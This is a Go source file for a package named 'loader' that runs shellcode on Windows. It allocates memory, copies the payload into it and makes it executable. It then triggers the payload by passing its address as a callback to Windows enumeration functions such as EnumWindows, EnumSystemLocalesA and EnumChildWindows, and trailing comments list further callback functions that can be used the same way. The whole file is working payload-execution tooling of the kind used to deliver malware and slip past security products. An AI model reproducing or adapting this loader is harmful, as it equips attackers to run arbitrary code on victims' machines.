package loader

import (
	"fmt"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func AllocMemory(shellcode []byte) (uintptr, error) {
	addr, err := xwindows.VirtualAlloc(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil || addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc failed: %w", err)
	}

	rmErr := xwindows.RtlMoveMemory(
		unsafe.Pointer(addr),
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
	)
	if rmErr != nil {
		return 0, fmt.Errorf("RtlMoveMemory failed: %w", err)
	}

	var oldProtect uint32
	_, vpErr := xwindows.VirtualProtect(
		addr,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if vpErr != nil {
		return 0, fmt.Errorf("VirtualProtect failed: %w", err)
	}

	return addr, nil
}

func EnumWindowsAction(action func(uintptr) error, shellcode []byte) error {
	addr, err := AllocMemory(shellcode)
	if err != nil {
		return err
	}
	return action(addr)
}

// EnumChildWindowsX C++ EnumChildWindows(NULL, (WNDENUMPROC)addr, 0);
func EnumChildWindowsX(shellcode []byte) error {
	return EnumWindowsAction(func(addr uintptr) error {
		xwindows.EnumChildWindows(0, addr, nil)
		return nil
	}, shellcode)
}

func EnumerateLoadedModulesX(shellcode []byte) error {
	return EnumWindowsAction(func(addr uintptr) error {
		handle, _ := xwindows.GetCurrentProcess()
		_, err := xwindows.EnumerateLoadedModules(handle, addr, 0)
		return err
	}, shellcode)
}

func EnumPageFilesWX(shellcode []byte) error {
	return EnumWindowsAction(func(addr uintptr) error {
		_, err := xwindows.EnumPageFilesW(addr, 0)
		return err
	}, shellcode)
}

// EnumWindowsX C++ EnumWindows((WNDENUMPROC)addr, 0);
func EnumWindowsX(shellcode []byte) error {
	return EnumWindowsAction(func(addr uintptr) error {
		_, err := xwindows.EnumWindows(windows.Handle(addr), 0)
		return err
	}, shellcode)
}

// EnumTimeFormatsAX C++ EnumTimeFormatsA((TIMEFMT_ENUMPROCA)addr, 0, 0);
func EnumTimeFormatsAX(shellcode []byte) error {
	return EnumWindowsAction(func(addr uintptr) error {
		_, err := xwindows.EnumTimeFormatsA(windows.HWND(addr), 0x0C00, 0)
		return err
	}, shellcode)
}

// EnumSystemLocalesAX C++ EnumSystemLocalesA((LOCALE_ENUMPROCA)addr, 0);
func EnumSystemLocalesAX(shellcode []byte) error {
	return EnumWindowsAction(func(addr uintptr) error {
		_, err := xwindows.EnumSystemLocalesA(addr, 0)
		return err
	}, shellcode)
}

// EnumDesktopWindowsX C++ EnumDesktopWindows(NULL,(WNDENUMPROC)addr, 0);
func EnumDesktopWindowsX(shellcode []byte) error {
	return EnumWindowsAction(func(addr uintptr) error {
		_, err := xwindows.EnumDesktopWindows(0, addr, 0)
		return err
	}, shellcode)
}

// EnumThreadWindowsX C++ EnumThreadWindows(0, (WNDENUMPROC)addr, 0);
func EnumThreadWindowsX(shellcode []byte) error {
	return EnumWindowsAction(func(addr uintptr) error {
		_, err := xwindows.EnumThreadWindows(0, addr, 0)
		return err
	}, shellcode)
}

// EnumSystemLocalesA((LOCALE_ENUMPROCA)addr, 0);
// EnumTimeFormatsA((TIMEFMT_ENUMPROCA)addr, 0, 0);
// EnumWindows((WNDENUMPROC)addr, 0);
// EnumDesktopWindows(NULL,(WNDENUMPROC)addr, 0);
// EnumThreadWindows(0, (WNDENUMPROC)addr, 0);
// EnumSystemGeoID(0, 0, (GEO_ENUMPROC)addr);
// EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)addr, 0, 0);
// EnumUILanguagesA((UILANGUAGE_ENUMPROCA)addr, 0, 0);
// EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)addr, 0);
// EnumDesktopsW(NULL,(DESKTOPENUMPROCW)addr, NULL);
// EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)addr, 0);
// EnumDateFormatsA((DATEFMT_ENUMPROCA)addr, 0, 0);
// EnumChildWindows(NULL, (WNDENUMPROC)addr, 0);
